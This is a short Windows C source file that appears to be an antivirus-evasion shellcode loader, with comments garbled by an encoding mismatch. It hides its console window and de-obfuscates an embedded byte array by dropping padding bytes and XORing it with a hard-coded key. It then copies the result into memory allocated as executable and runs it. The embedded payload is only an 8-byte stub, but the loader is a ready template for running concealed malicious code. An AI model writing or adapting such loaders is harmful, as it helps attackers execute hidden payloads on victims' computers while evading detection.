#include <windows.h>
#include <stdio.h>
typedef void(_stdcall* CODE)();
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
unsigned char shellcode[] = "\x9a\x66\x2c\x64\xe2\x61\x91\x75";

void main()
{
    int shellcode_size = 0; //ԭʼshellcode����
    int shellcode_final_size = 0; //����֮���shellcode����
    char key[] = "fdaufdiqe";
    int j;
	int i;
    int key_size = sizeof(key) - 1;
    unsigned char* shellcode_final;

    // ��ȡshellcode��С
    shellcode_size = sizeof(shellcode);
    // ���ݼ���֮��shellcode�Ĵ�С�������������֮��Ĵ�СΪ(shellcode_size + 1) / 2
    shellcode_final_size = (shellcode_size + 1) / 2;
    shellcode_final = (char*)malloc(shellcode_final_size);
    
    //����ȥ���������룬�����������shellcode_final
    j = 0;
    for (i = 0; i < shellcode_size; i++) {
        if (i % 2 == 0) {
            shellcode_final[j] = shellcode[i];
            j += 1;
        }
    }

    //Ȼ������������ԭshellcode
    for (i = 0; i < shellcode_final_size; i++) {
        shellcode_final[i] ^= key[i % key_size];
    }

    PVOID p = NULL;
    p = VirtualAlloc(NULL, shellcode_final_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (p == NULL)
    {
        return;
    }
    memcpy(p, shellcode_final, shellcode_final_size);

    CODE code = (CODE)p;
    code();
}
